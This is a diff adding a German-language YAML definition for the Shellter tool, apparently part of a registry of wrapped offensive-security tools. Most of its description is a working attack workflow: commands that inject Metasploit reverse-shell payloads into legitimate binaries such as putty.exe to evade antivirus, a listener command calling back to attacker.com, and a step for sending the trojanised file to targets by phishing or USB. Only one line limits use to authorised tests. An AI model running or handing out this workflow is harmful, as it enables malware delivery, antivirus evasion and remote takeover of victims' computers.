@@ -1,0 +1,111 @@
+name: "shellter"
+command: "shellter"
+enabled: true
+short_description: "Shellter – PE-Injection & Shellcode-Einbettung in legitime Windows-Binaries"
+description: |
+  Shellter ist ein dynamisches Shellcode-Injection-Tool für Windows PE-Dateien (Portable Executable).
+  Es injiziert Shellcode in legitime Windows-Applikationen (z.B. putty.exe, winscp.exe) um AV-Erkennung
+  durch Signatur-Scanner zu umgehen. Shellter analysiert und modifiziert den PE-Execution-Flow dynamisch.
+
+  **Hauptfunktionen:**
+  - Shellcode in beliebige Windows-PE-Dateien injizieren
+  - Dynamische Analyse des Execution-Flows
+  - Polymorphe Encoder für Shellcode
+  - Stealth-Modus (minimale PE-Modifikation)
+  - Kompatibel mit Metasploit-Payloads
+  - Auto-Modus für schnelle Payload-Erstellung
+
+  **Auto-Modus (empfohlen):**
+  ```bash
+  # Automatische Injection in legitime Binary
+  shellter -f /path/to/putty.exe -a -p windows/meterpreter/reverse_tcp --lhost 192.168.1.10 --lport 4444
+
+  # Mit Stealth-Option
+  shellter -f /path/to/winrar.exe -a -p windows/shell_reverse_tcp --lhost 192.168.1.10 --lport 443
+  ```
+
+  **Manueller Modus:**
+  ```bash
+  # Interaktiver Modus
+  shellter
+
+  # Dann:
+  # A - Auto Modus
+  # PE Target: /path/to/binary.exe
+  # Stealth Mode: Y
+  # Payload: L (Liste) oder C (Custom)
+  # Custom: eigener Shellcode (RAW-Bytes)
+  ```
+
+  **Typischer Red Team Workflow:**
+  ```bash
+  # 1. Legitimes Tool herunterladen (z.B. putty.exe)
+  wget https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
+
+  # 2. Shellter-Injection
+  shellter -f putty.exe -a -p windows/x64/meterpreter/reverse_https --lhost attacker.com --lport 443
+
+  # 3. Listener starten
+  msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST attacker.com; set LPORT 443; run"
+
+  # 4. Trojanisierte putty.exe an Ziel senden (Phishing, USB, etc.)
+  ```
+
+  **Encoder-Optionen:**
+  - Polymorphe XOR-Encoder
+  - Multi-Byte-Encoder
+  - Customizable Encoder-Ketten
+
+  **Verwendungsszenarien:**
+  - Trojanisierte Binaries für Initial Access
+  - AV-Bypass durch legitime PE-Basis
+  - Red Team Payload-Delivery
+  - Antivirus-Testing und Evasion-Research
+
+  **Hinweise:**
+  - Auf Linux via Wine ausführbar
+  - 32-bit PEs werden bevorzugt
+  - Stealth-Modus für bessere Tarnung
+  - Nur für autorisierte Penetrationstests
+parameters:
+  - name: "file"
+    type: "string"
+    description: "Pfad zur Ziel-PE-Datei (legitime Windows-Binary)"
+    required: true
+    flag: "-f"
+    format: "flag"
+  - name: "auto"
+    type: "bool"
+    description: "Auto-Modus aktivieren (schnelle automatische Injection)"
+    required: false
+    default: true
+    flag: "-a"
+    format: "flag"
+  - name: "payload"
+    type: "string"
+    description: "Metasploit-Payload (z.B. windows/meterpreter/reverse_tcp)"
+    required: false
+    default: ""
+    flag: "-p"
+    format: "flag"
+  - name: "lhost"
+    type: "string"
+    description: "Angreifer-IP/Host für Reverse-Verbindung"
+    required: false
+    default: ""
+    flag: "--lhost"
+    format: "flag"
+  - name: "lport"
+    type: "int"
+    description: "Angreifer-Port für Reverse-Verbindung"
+    required: false
+    default: 4444
+    flag: "--lport"
+    format: "flag"
+  - name: "stealth"
+    type: "bool"
+    description: "Stealth-Modus aktivieren (minimale PE-Modifikation)"
+    required: false
+    default: false
+    flag: "--stealth"
+    format: "flag"
